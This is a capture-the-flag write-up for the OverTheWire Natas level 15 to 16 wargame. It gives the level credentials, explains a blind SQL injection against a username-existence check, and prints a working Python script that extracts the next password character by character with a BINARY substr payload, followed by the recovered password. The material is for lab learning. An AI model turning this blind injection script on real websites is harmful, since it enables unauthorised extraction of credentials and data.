# Natas Level 15 to 16

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 15 -> 16 |
| Status | Complete |

## Objective

Extract the next password with blind SQL injection.

## Given Access

User: `natas15`

Password:

```text
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

## Method

The page only reports whether a queried username exists. Inject a condition against the `natas16` user's password and use the page response as a boolean oracle, checking one character at a time with `BINARY substr(...)`.

## Commands

```python
import requests, string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
chars = string.ascii_letters + string.digits
password = ""

for pos in range(1, 65):
    for ch in chars:
        inj = f'natas16" and BINARY substr(password,{pos},1)="{ch}" #'
        r = requests.get(url, auth=auth, params={"username": inj}, timeout=10)
        if "This user exists." in r.text:
            password += ch
            print(password)
            break
    else:
        break
```

## Result

Password for `natas16`:

```text
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Lesson

Blind SQL injection can recover full values from yes/no responses. Case-sensitive comparison matters when extracting mixed-case secrets.

## References

- https://overthewire.org/wargames/natas/
